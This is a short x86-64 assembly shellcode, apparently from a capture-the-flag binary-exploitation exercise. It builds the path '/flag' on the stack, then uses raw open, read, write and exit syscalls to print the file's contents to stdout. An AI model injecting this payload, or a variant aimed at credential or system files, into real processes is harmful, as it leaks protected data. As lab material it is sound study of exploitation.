.intel_syntax noprefix
.global _start
_start:
    mov rbx, 0x67616c662f
    push rbx
     
    mov rdi, rsp                  #rdi = flag
    xor rsi, rsi                  #rsi = 0
    xor rdx, rdx                  #rdx = 0
    mov rax, 2                    # syscall: open
    syscall

    mov rdi, rax                  # rdi = fd
    mov rsi, rsp                  # rsi = buffer
    mov rdx, 0x100                # rdx = length
    xor rax, rax                  # syscall: read (rax = 0)
    syscall

    mov rdi, 1                    # rdi = stdout
    mov rax, 1                    # syscall: write
    syscall

    mov rdi, 0                    # rdi = 0
    mov rax, 60                   # syscall: exit
    syscall